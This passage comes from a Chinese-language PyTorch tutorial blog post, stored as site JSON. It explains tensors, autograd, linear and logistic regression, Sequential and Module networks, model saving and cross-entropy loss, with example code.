$p(x)=Pr(X=x)$，事件 $X=x_0$的信息量为 $I(x_0)=-log(p(x_0))$。从表达式可以看出，概率越大，信息量越小。概率越大，大家越会认为这一事件的发生几乎是确定的，这一事件的发生并不会引入太多信息量。</p>\n</li>\n<li><p>熵</p>\n<p>假设李华考试结果为一个0-1分布，{0不及格，1及格}，根据先验知识，由于李华不好好学习，考试及格(记为事件A)概率是$p(x_A)=0.1$，不及格的概率是0.9，则所有可能结果带来的额外信息的期望为</p>\n<p>$$H_A(x)=-[p(x_A)log(p(x_A))+(1-P(x_A))log(1-p(x_A))]=0.469$$</p>\n<p>如果还有一个张华成绩不好不坏，考试及格(记为时间B)概率是 $p(x_B)=0.5$</p>\n<p>$$H_B(x)=-[p(x_B)log(p(x_B))+(1-P(x_B))log(1-p(x_B))]=1$$</p>\n<p>说明在成绩出来前，猜出张华的结果比李华要难。熵越大，变量取值越不稳定。</p>\n</li>\n<li><p>交叉熵</p>\n<p>两个分布$p,q$，$CEH(p,q)=E_p[-logq]$</p>\n</li>\n</ul>\n<p>对于二分类问题，loss可以写为</p>\n<p>$$-\\frac{1}{m}\\sum^m_{i=1}(y^ilog\\, sigmod(x^i)+(1-y^i)log(1-sigmod(x^i)))$$</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># pytorch 提供了交叉熵函数</span></span><br><span class=\"line\">criterion = nn.CrossEntropyLoss()</span><br></pre></td></tr></table></figure>\n<h3 id=\"1-4-参数初始化\"><a href=\"#1-4-参数初始化\" class=\"headerlink\" title=\"1.4 参数初始化\"></a>1.4 参数初始化</h3><ul>\n<li><strong>使用numpy初始化</strong></li>\n</ul>\n","site":{"data":{"projects":[{"name":"Sjtueat","url":"http://sjtueat.miyunluo.com","desc":"Help you to decide what to eat today"},{"name":"Easy Flash Tool","url":"https://github.com/miyunluo/CortexM4-flashtool","desc":"A easy python flash tool for TI TM4C1294"}]}},"excerpt":"","more":"<blockquote>\n<p>“防止以后踩坑”</p>\n</blockquote>\n<p>第一眼看到pytorch就十分喜欢，就像第一眼看到golang。</p>\n<p>pytorch 0.4 发布，api改了。。。</p>\n<h3 id=\"0-0-Tensor-and-Variable\"><a href=\"#0-0-Tensor-and-Variable\" class=\"headerlink\" title=\"0.0 Tensor and Variable\"></a>0.0 Tensor and Variable</h3><ul>\n<li><strong>Tensor</strong></li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 沿行取最大值</span></span><br><span class=\"line\">max_value, max_idx = torch.max(x, dim=<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"comment\"># 沿行求和</span></span><br><span class=\"line\">sum_x = torch.sum(x, dim=<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 增减维度</span></span><br><span class=\"line\">x = x.unsqueeze(<span class=\"number\">0</span>) <span class=\"comment\"># 在第一维增加</span></span><br><span class=\"line\">x = x.unsqueeze(<span class=\"number\">1</span>) <span class=\"comment\"># 在第二维增加</span></span><br><span class=\"line\"></span><br><span class=\"line\">x = x.squeeze(<span class=\"number\">0</span>)   <span class=\"comment\"># 减少第一维度</span></span><br><span class=\"line\">x = x.squeeze()    <span class=\"comment\"># tensor中所有维度为1全部去掉</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 维度交换</span></span><br><span class=\"line\">x = torch.randn(<span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>)</span><br><span class=\"line\"><span class=\"comment\"># permute 重新排列</span></span><br><span class=\"line\">x = x.permute(<span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>) <span class=\"comment\"># x : torch.Size([4, 3, 5])</span></span><br><span class=\"line\"><span class=\"comment\"># transpose 交换 tensor 中两个维度</span></span><br><span class=\"line\">x = x.transpose(<span class=\"number\">0</span>, <span class=\"number\">2</span>)  <span class=\"comment\"># x : torch.Size([5, 3, 4])</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># view 对 tensor 进行 reshape</span></span><br><span class=\"line\">x = torch.randn(<span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>)</span><br><span class=\"line\">x = x.view(<span class=\"number\">-1</span>, <span class=\"number\">5</span>) <span class=\"comment\"># -1 表示任意大小，5 表示第二维变成 5</span></span><br><span class=\"line\">\t\t\t\t  <span class=\"comment\"># x : torch.Size([12, 5])</span></span><br><span class=\"line\">x = x.view(<span class=\"number\">3</span>, <span class=\"number\">20</span>) <span class=\"comment\"># x : torch.Size([3, 20])</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># inplace 操作，直接对tensor操作而不需要另外开辟内存空间。一般是操作符后加_</span></span><br><span class=\"line\">x.unsqueeze_(<span class=\"number\">0</span>)     <span class=\"comment\"># unsqueeze 进行 inplace</span></span><br><span class=\"line\">x.transpose_(<span class=\"number\">1</span>, <span class=\"number\">0</span>)  <span class=\"comment\"># transpose 进行 inplace</span></span><br><span class=\"line\"></span><br><span class=\"line\">x = torch.ones(<span class=\"number\">3</span>, <span class=\"number\">3</span>)</span><br><span class=\"line\">y = torch.ones(<span class=\"number\">3</span>, <span class=\"number\">3</span>)</span><br><span class=\"line\">x.add_(y)\t<span class=\"comment\"># add 进行 inplace</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li><p><strong>Variable</strong></p>\n<p>Variable 是对 tensor 的封装，每个 Variabel都有三个属性，Variable 中的 tensor本身<code>.data</code>，对应 tensor 的梯度<code>.grad</code>以及这个 Variable 是通过什么方式得到的<code>.grad_fn</code></p>\n</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">x_tensor = torch.randn(<span class=\"number\">10</span>, <span class=\"number\">5</span>)</span><br><span class=\"line\">y_tensor = torch.randn(<span class=\"number\">10</span>, <span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 tensor 变成 Variable</span></span><br><span class=\"line\">x = Variable(x_tensor, requires_grad=<span class=\"keyword\">True</span>) </span><br><span class=\"line\"><span class=\"comment\"># 默认 Variable 是不需要求梯度的，所以申明需要对其进行求梯度</span></span><br><span class=\"line\">y = Variable(y_tensor, requires_grad=<span class=\"keyword\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">z = torch.sum(x + y)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 求 x 和 y 的梯度</span></span><br><span class=\"line\">z.backward()</span><br><span class=\"line\"></span><br><span class=\"line\">print(x.grad)</span><br><span class=\"line\"><span class=\"comment\"># Variable containing:</span></span><br><span class=\"line\"><span class=\"comment\">#     1     1     1     1     1</span></span><br><span class=\"line\"><span class=\"comment\">#     1     1     1     1     1</span></span><br><span class=\"line\"><span class=\"comment\">#     1     1     1     1     1</span></span><br><span class=\"line\"><span class=\"comment\">#     1     1     1     1     1</span></span><br><span class=\"line\"><span class=\"comment\">#     1     1     1     1     1</span></span><br><span class=\"line\"><span class=\"comment\">#     1     1     1     1     1</span></span><br><span class=\"line\"><span class=\"comment\">#     1     1     1     1     1</span></span><br><span class=\"line\"><span class=\"comment\">#     1     1     1     1     1</span></span><br><span class=\"line\"><span class=\"comment\">#     1     1     1     1     1</span></span><br><span class=\"line\"><span class=\"comment\">#     1     1     1     1     1</span></span><br><span class=\"line\"><span class=\"comment\"># [torch.FloatTensor of size 10x5]</span></span><br><span class=\"line\"></span><br><span class=\"line\">print(y.grad)</span><br></pre></td></tr></table></figure>\n<h3 id=\"0-1-自动求导\"><a href=\"#0-1-自动求导\" class=\"headerlink\" title=\"0.1 自动求导\"></a>0.1 自动求导</h3><ul>\n<li><p><strong>多次自动求导</strong></p>\n<p>调用 backward 后自动计算一次导数，再次调用会报错，因为pytorch默认做完一次自动求导后，计算图被丢弃，两次求导需要手动设置。</p>\n</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">x = Variable(torch.FloatTensor([<span class=\"number\">3</span>]), requires_grad=<span class=\"keyword\">True</span>)</span><br><span class=\"line\">y = x * <span class=\"number\">2</span> + x ** <span class=\"number\">2</span> + <span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\">y.backward(retain_graph=<span class=\"keyword\">True</span>)</span><br><span class=\"line\">print(x.grad)</span><br><span class=\"line\"><span class=\"comment\"># Variable containing:</span></span><br><span class=\"line\"><span class=\"comment\">#  8</span></span><br><span class=\"line\"><span class=\"comment\"># [torch.FloatTensor of size 1]</span></span><br><span class=\"line\"></span><br><span class=\"line\">y.backward(retain_graph=<span class=\"keyword\">True</span>)</span><br><span class=\"line\">print(x.grad) </span><br><span class=\"line\"><span class=\"comment\"># 输出 16，因为做了两次自动求导，所以将第一次的梯度 8 和第二次的梯度 8 相加得到 16</span></span><br><span class=\"line\"></span><br><span class=\"line\">y.backward() <span class=\"comment\"># 再做一次自动求导，这次不保留计算图</span></span><br><span class=\"line\">print(x.grad)</span><br><span class=\"line\"><span class=\"comment\"># 输出 24</span></span><br><span class=\"line\"></span><br><span class=\"line\">y.backward() <span class=\"comment\"># 再做会报错，计算图已经丢弃</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"0-2-动态图与静态图\"><a href=\"#0-2-动态图与静态图\" class=\"headerlink\" title=\"0.2 动态图与静态图\"></a>0.2 动态图与静态图</h3><p>pytorch与python的写法基本一致，没有任何额外的学习成本。tensorflow需要先定义图，然后执行，不能直接使用while，需要使用tf.while_loop，有些反直觉。</p>\n<h3 id=\"1-0-线性模型与梯度下降\"><a href=\"#1-0-线性模型与梯度下降\" class=\"headerlink\" title=\"1.0 线性模型与梯度下降\"></a>1.0 线性模型与梯度下降</h3><p>最简单的线性模型$y=x*w+b$，计算误差函数为$\\frac{1}{n}\\sum^n_{i=1}(\\widehat{y}_i-y_i)^2$</p>\n<p>数分里都学过梯度的意义在于，沿着梯度函数变化最快，为了尽快找到误差的最小值，需要沿着梯度方向更新$w,b$，二者的梯度分别为</p>\n<p>$$\\frac{\\partial}{\\partial w}=\\frac{2}{n}\\sum^n_{i=1}x_i(wx_i+b-y_i)$$</p>\n<p>$$\\frac{\\partial}{\\partial b}=\\frac{2}{n}\\sum^n_{i=1}(wx_i+b-y_i)$$</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">from</span> torch.autograd <span class=\"keyword\">import</span> Variable</span><br><span class=\"line\">torch.manual_seed(<span class=\"number\">2018</span>)</span><br><span class=\"line\"><span class=\"comment\"># 读入数据 x 和 y</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读入数据 x 和 y</span></span><br><span class=\"line\">x_train = np.array([...], dtype=np.float32)</span><br><span class=\"line\">y_train = np.array([...], dtype=np.float32)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 转换成 Tensor</span></span><br><span class=\"line\">x_train = torch.from_numpy(x_train)</span><br><span class=\"line\">y_train = torch.from_numpy(y_train)</span><br><span class=\"line\"><span class=\"comment\"># 定义参数 w 和 b</span></span><br><span class=\"line\">w = Variable(torch.randn(<span class=\"number\">1</span>), requires_grad=<span class=\"keyword\">True</span>) <span class=\"comment\"># 随机初始化</span></span><br><span class=\"line\">b = Variable(torch.zeros(<span class=\"number\">1</span>), requires_grad=<span class=\"keyword\">True</span>) <span class=\"comment\"># 使用0进行初始化</span></span><br><span class=\"line\"><span class=\"comment\"># 构建线性回归模型</span></span><br><span class=\"line\">x_train = Variable(x_train)</span><br><span class=\"line\">y_train = Variable(y_train)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">linear_model</span><span class=\"params\">(x)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> x * w + b</span><br><span class=\"line\"><span class=\"comment\"># 计算误差</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_loss</span><span class=\"params\">(y_, y)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> torch.mean((y_ - y_train) ** <span class=\"number\">2</span>)</span><br><span class=\"line\">loss = get_loss(y_, y_train)</span><br><span class=\"line\"><span class=\"comment\"># 自动求导</span></span><br><span class=\"line\">loss.backward()</span><br><span class=\"line\"><span class=\"comment\"># 查看 w 和 b 的梯度</span></span><br><span class=\"line\">print(w.grad)</span><br><span class=\"line\">print(b.grad)</span><br><span class=\"line\"><span class=\"comment\"># 更新一次参数</span></span><br><span class=\"line\">w.data = w.data - <span class=\"number\">1e-2</span> * w.grad.data</span><br><span class=\"line\">b.data = b.data - <span class=\"number\">1e-2</span> * b.grad.data</span><br></pre></td></tr></table></figure>\n<h3 id=\"1-1-逻辑回归\"><a href=\"#1-1-逻辑回归\" class=\"headerlink\" title=\"1.1 逻辑回归\"></a>1.1 逻辑回归</h3><p>Logistic 回归处理的是一个分类问题 (二分类)，形式与线性回归一样，都是 $y=wx+b$，但是它使用 Sigmod 函数将结果变到 0 ~ 1 之间。对于任意输入一个数据，经过 Sigmoid 之后的结果记为 $\\widehat{y}$</p>\n<ul>\n<li>损失函数</li>\n</ul>\n<p>$$loss=-(ylog(\\widehat{y})+(1-y)log(1-\\widehat{y}))$$</p>\n<p>$y$ 表示真实 label，取值 {0, 1}。如果 $y$ 是 0，表示属于第一类，则希望 $\\widehat{y}$ 越小越好，这时 $loss$ 函数为，$loss=-(log(1-\\widehat{y}))$，根据函数单调性，最小化 $loss$ 也就是最小化 $\\widehat{y}$，与要求一致。</p>\n<p>如果 $y$ 是 1，表示属于第二类，则希望 $\\widehat{y}$ 越大越好，这时 $loss$ 函数为，$loss=-(log(\\widehat{y}))$，最小化 $loss$ 是最大化 $\\widehat{y}$。</p>\n<p>使用 <code>torch.optim</code> 更新参数，需要配合另一个数据类型 <code>nn.Parameter</code>，本质上与 Variable 一样，但是 Parameter 默认要求梯度。pytorch 也提供了 Sigmode 函数，通过导入 <code>torch.nn.functional</code> 使用。</p>\n<p>pytorch 提供了 <code>nn.BCEWithLogitsLoss()</code>，将 sigmoid 和 loss 写在一层，有更快的速度与稳定性。所以使用它的话，就不需要再定义 Sigmod 函数了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 不使用自带的loss</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.nn <span class=\"keyword\">as</span> nn</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.nn.functional <span class=\"keyword\">as</span> F</span><br><span class=\"line\">w = nn.Parameter(torch.randn(<span class=\"number\">2</span>, <span class=\"number\">1</span>))</span><br><span class=\"line\">b = nn.Parameter(torch.zeros(<span class=\"number\">1</span>))</span><br><span class=\"line\"><span class=\"comment\"># 定义sigmod</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">logistic_regression</span><span class=\"params\">(x)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> F.sigmoid(torch.mm(x, w) + b)</span><br><span class=\"line\"><span class=\"comment\"># 定义loss</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binary_loss</span><span class=\"params\">(y_pred, y)</span>:</span></span><br><span class=\"line\">    logits = (y * y_pred.clamp(<span class=\"number\">1e-12</span>).log() + (<span class=\"number\">1</span> - y) * (<span class=\"number\">1</span> - y_pred).clamp(<span class=\"number\">1e-12</span>).log()).mean()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> -logits</span><br><span class=\"line\"><span class=\"comment\">#- - - - - - - - - - - - - - - - - - - -</span></span><br><span class=\"line\">optimizer = torch.optim.SGD([w, b], lr=<span class=\"number\">1.</span>)</span><br><span class=\"line\"><span class=\"comment\"># 前向传播</span></span><br><span class=\"line\">y_pred = logistic_regression(x_data)</span><br><span class=\"line\">loss = binary_loss(y_pred, y_data) <span class=\"comment\"># 计算 loss</span></span><br><span class=\"line\"><span class=\"comment\"># 反向传播</span></span><br><span class=\"line\">optimizer.zero_grad() <span class=\"comment\"># 使用优化器将梯度归 0</span></span><br><span class=\"line\">loss.backward()</span><br><span class=\"line\">optimizer.step() <span class=\"comment\"># 使用优化器来更新参数</span></span><br><span class=\"line\"><span class=\"comment\">##########################################</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 使用自带的loss</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.nn <span class=\"keyword\">as</span> nn</span><br><span class=\"line\">criterion = nn.BCEWithLogitsLoss()</span><br><span class=\"line\"><span class=\"comment\"># 使用 torch.optim 更新参数</span></span><br><span class=\"line\">w = nn.Parameter(torch.randn(<span class=\"number\">2</span>, <span class=\"number\">1</span>))</span><br><span class=\"line\">b = nn.Parameter(torch.zeros(<span class=\"number\">1</span>))</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">logistic_reg</span><span class=\"params\">(x)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> torch.mm(x, w) + b</span><br><span class=\"line\"><span class=\"comment\">#- - - - - - - - - - - - - - - - - - - -</span></span><br><span class=\"line\">optimizer = torch.optim.SGD([w, b], lr=<span class=\"number\">1.</span>)</span><br><span class=\"line\"><span class=\"comment\"># 前向传播</span></span><br><span class=\"line\">y_pred = logistic_reg(x_data)</span><br><span class=\"line\">loss = criterion(y_pred, y_data)</span><br><span class=\"line\"><span class=\"comment\"># 反向传播</span></span><br><span class=\"line\">optimizer.zero_grad()</span><br><span class=\"line\">loss.backward()</span><br><span class=\"line\">optimizer.step()</span><br><span class=\"line\"><span class=\"comment\"># 计算正确率</span></span><br><span class=\"line\">mask = y_pred.ge(<span class=\"number\">0.5</span>).float()</span><br><span class=\"line\">acc = (mask == y_data).sum().data[<span class=\"number\">0</span>] / y_data.shape[<span class=\"number\">0</span>]</span><br></pre></td></tr></table></figure>\n<h3 id=\"1-2-MLP-Sequential-Module\"><a href=\"#1-2-MLP-Sequential-Module\" class=\"headerlink\" title=\"1.2 MLP, Sequential, Module\"></a>1.2 MLP, Sequential, Module</h3><p><strong>MLP</strong></p>\n<p>神经网络使用的激活函数都是非线性的，sigmode函数 $\\sigma(x)=\\frac{1}{1+e^{-x}}$，tanh函数 $tanh(x)=2\\sigma(2x)-1$，ReLU函数 $ReLU(x)=max(0,x)$。其中ReLU使用的较多，因为计算简单，可以加速梯度下降的收敛速度。</p>\n<ul>\n<li><p>为什么要使用激活函数</p>\n<p>假设一个两层的网络，不使用激活函数，结构为$y=w_2(w_1x)=(w_2w_1)x=wx$，实际和一个一层的网络一样。</p>\n<p>通过使用激活函数，网络可以通过改变权重实现任意形状，成为非线性分类器。</p>\n</li>\n</ul>\n<p><strong>Sequential</strong></p>\n<p>Sequential 用来构建序列化模型</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># sequential</span></span><br><span class=\"line\">seq_net = nn.Sequential(</span><br><span class=\"line\">\tnn.Linear(<span class=\"number\">2</span>,<span class=\"number\">4</span>),</span><br><span class=\"line\">    nn.Tanh(),</span><br><span class=\"line\">    nn.Linear(<span class=\"number\">4</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"comment\"># 序列化模型可以通过索引访问每一层</span></span><br><span class=\"line\">seq_net[<span class=\"number\">0</span>]</span><br><span class=\"line\"><span class=\"comment\"># 打印第一层权重</span></span><br><span class=\"line\">w0 = seq_net[<span class=\"number\">0</span>].weight</span><br><span class=\"line\">print(w0)</span><br><span class=\"line\"><span class=\"comment\"># 通过parameters获得模型参数</span></span><br><span class=\"line\">param = seq_net.parameters()</span><br><span class=\"line\"><span class=\"comment\"># 定义优化器</span></span><br><span class=\"line\">optim = torch.optim.SGD(param, <span class=\"number\">1.</span>)</span><br></pre></td></tr></table></figure>\n<p>保存模型</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 将参数和模型保存在一起</span></span><br><span class=\"line\">torch.save(seq_net, <span class=\"string\">'save_seq_net.pth'</span>)</span><br><span class=\"line\"><span class=\"comment\"># 读取保存的模型</span></span><br><span class=\"line\">seq_net1 = torch.load(<span class=\"string\">'save_seq_net.pth'</span>)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 只保存模型参数</span></span><br><span class=\"line\">torch.save(seq_net.state_dict(), <span class=\"string\">'save_seq_net_params.pth'</span>)</span><br><span class=\"line\"><span class=\"comment\"># 要重新读入模型的参数，首先我们需要重新定义一次模型，接着重新读入参数</span></span><br><span class=\"line\">seq_net2 = nn.Sequential(</span><br><span class=\"line\">    nn.Linear(<span class=\"number\">2</span>, <span class=\"number\">4</span>),</span><br><span class=\"line\">    nn.Tanh(),</span><br><span class=\"line\">    nn.Linear(<span class=\"number\">4</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">)</span><br><span class=\"line\">seq_net2.load_state_dict(torch.load(<span class=\"string\">'save_seq_net_params.pth'</span>))</span><br></pre></td></tr></table></figure>\n<p><strong>Module</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># module模板</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> 网络名字<span class=\"params\">(nn.Module)</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, 一些定义的参数)</span>:</span></span><br><span class=\"line\">        super(网络名字, self).__init__()</span><br><span class=\"line\">        self.layer1 = nn.Linear(num_input, num_hidden)</span><br><span class=\"line\">        self.layer2 = nn.Sequential(...)</span><br><span class=\"line\">        ...</span><br><span class=\"line\"></span><br><span class=\"line\">        定义需要用的网络层</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">forward</span><span class=\"params\">(self, x)</span>:</span> <span class=\"comment\"># 定义前向传播</span></span><br><span class=\"line\">        x1 = self.layer1(x)</span><br><span class=\"line\">        x2 = self.layer2(x)</span><br><span class=\"line\">        x = x1 + x2</span><br><span class=\"line\">        ...</span><br><span class=\"line\">        <span class=\"keyword\">return</span> x</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"comment\"># 访问模型中的某层可以直接通过名字</span></span><br><span class=\"line\">l1 = 网络名字.layer1</span><br></pre></td></tr></table></figure>\n<h3 id=\"1-3-多分类网络\"><a href=\"#1-3-多分类网络\" class=\"headerlink\" title=\"1.3 多分类网络\"></a>1.3 多分类网络</h3><p><strong>softmax</strong></p>\n<p>设多分类网络输出为 $z_1,z_2,…,z_k$，首先取指数变成 $e^{z_1},e^{z_2},…,e^{z_k}$，每一项都除以求和</p>\n<p>$$\\frac{e^{z_i}}{\\sum^k_{j=1}e^{z_j}}$$</p>\n<p>于是所有项求和等于1，每一项分别表示其中某一种的概率。</p>\n<p><strong>交叉熵</strong></p>\n<p>多分类问题使用更加复杂的loss函数，交叉熵。</p>\n<p>$$cross_entropy(p,q)=E_p[-logq]=-\\frac{1}{m}p(x)logq(x)$$</p>\n<p>这里需要back up一下。所谓 <strong>熵</strong> 是用来反应信息量的。</p>\n<ul>\n<li><p>信息量</p>\n<p>假设 $X$ 